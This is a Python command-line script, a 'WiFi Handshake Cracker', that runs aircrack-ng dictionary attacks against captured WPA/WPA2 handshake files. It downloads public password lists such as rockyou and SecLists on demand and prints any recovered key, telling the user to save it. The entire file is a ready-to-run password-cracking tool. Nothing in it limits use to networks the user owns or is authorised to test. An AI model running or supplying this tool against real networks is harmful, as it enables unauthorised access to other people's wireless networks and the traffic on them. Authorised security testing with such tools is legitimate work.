#!/usr/bin/env python3
"""
WiFi Handshake Cracker
Uses online wordlists for WPA/WPA2 cracking

Requires: aircrack-ng (pkg install aircrack-ng)

Usage:
    python wifi_cracker.py <capture_file.cap> [wordlist_url]

Common wordlists:
    - rockyou.txt (default)
    - https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
    - https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
"""

import subprocess
import sys
import os
import urllib.request
import tempfile
import time

# Default wordlist URLs (will download on demand)
WORDLISTS = {
    "rockyou": "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt",
    "top10k": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt",
    "top100k": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt",
    "wifi-common": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt",
}

def download_wordlist(url, dest_path):
    """Download wordlist from URL with progress"""
    print(f"Downloading wordlist...")
    print(f"URL: {url}")
    print()

    try:
        # Show download progress
        def progress_hook(count, block_size, total_size):
            percent = int(count * block_size * 100 / total_size) if total_size > 0 else 0
            downloaded = count * block_size / 1024 / 1024  # MB
            print(f"\rProgress: {percent}% ({downloaded:.1f} MB)", end='', flush=True)

        urllib.request.urlretrieve(url, dest_path, progress_hook)
        print(f"\nDownloaded to: {dest_path}")
        return True

    except Exception as e:
        print(f"ERROR: Failed to download: {e}")
        return False


def check_aircrack():
    """Check if aircrack-ng is installed"""
    try:
        result = subprocess.run(["aircrack-ng", "--help"], capture_output=True)
        return True
    except FileNotFoundError:
        print("ERROR: aircrack-ng not found")
        print("Install with: pkg install aircrack-ng")
        return False


def run_aircrack(capture_file, wordlist_path, bssid=None):
    """Run aircrack-ng against capture file"""
    print()
    print("=" * 50)
    print("  STARTING CRACK")
    print("=" * 50)
    print(f"Capture: {capture_file}")
    print(f"Wordlist: {wordlist_path}")
    if bssid:
        print(f"BSSID: {bssid}")
    print()
    print("Running aircrack-ng...")
    print("-" * 50)

    cmd = ["aircrack-ng", "-w", wordlist_path, capture_file]
    if bssid:
        cmd.extend(["-b", bssid])

    try:
        # Run with real-time output
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )

        found_key = None
        for line in process.stdout:
            print(line, end='')

            # Check if key was found
            if "KEY FOUND!" in line or "KEY:" in line:
                found_key = line

        process.wait()

        print("-" * 50)
        if found_key:
            print()
            print("=" * 50)
            print("  PASSWORD FOUND!")
            print("=" * 50)
            print(found_key)
        else:
            print("No password found with this wordlist")

        return found_key

    except Exception as e:
        print(f"ERROR: {e}")
        return None


def main():
    print()
    print("=" * 50)
    print("  WIFI HANDSHAKE CRACKER")
    print("=" * 50)
    print()

    # Check arguments
    if len(sys.argv) < 2:
        print("Usage: python wifi_cracker.py <capture.cap> [wordlist]")
        print()
        print("Wordlist options:")
        for name, url in WORDLISTS.items():
            print(f"  {name}: {url[:50]}...")
        print()
        print("Or provide a direct URL or local file path")
        sys.exit(1)

    capture_file = sys.argv[1]
    wordlist_arg = sys.argv[2] if len(sys.argv) > 2 else "wifi-common"

    # Verify capture file exists
    if not os.path.exists(capture_file):
        print(f"ERROR: Capture file not found: {capture_file}")
        sys.exit(1)

    # Check aircrack-ng
    if not check_aircrack():
        sys.exit(1)

    # Determine wordlist path
    wordlist_path = None

    if wordlist_arg in WORDLISTS:
        # Use named wordlist
        url = WORDLISTS[wordlist_arg]
        wordlist_path = os.path.join(tempfile.gettempdir(), f"{wordlist_arg}.txt")

        if not os.path.exists(wordlist_path):
            if not download_wordlist(url, wordlist_path):
                sys.exit(1)
        else:
            print(f"Using cached wordlist: {wordlist_path}")

    elif wordlist_arg.startswith("http"):
        # Direct URL
        wordlist_path = os.path.join(tempfile.gettempdir(), "custom_wordlist.txt")
        if not download_wordlist(wordlist_arg, wordlist_path):
            sys.exit(1)

    elif os.path.exists(wordlist_arg):
        # Local file
        wordlist_path = wordlist_arg
        print(f"Using local wordlist: {wordlist_path}")

    else:
        print(f"ERROR: Wordlist not found: {wordlist_arg}")
        sys.exit(1)

    # Run the crack
    result = run_aircrack(capture_file, wordlist_path)

    if result:
        print()
        print("Save this password!")
        sys.exit(0)
    else:
        print()
        print("Try a larger wordlist:")
        for name in WORDLISTS:
            print(f"  python wifi_cracker.py {capture_file} {name}")
        sys.exit(1)


if __name__ == "__main__":
    main()
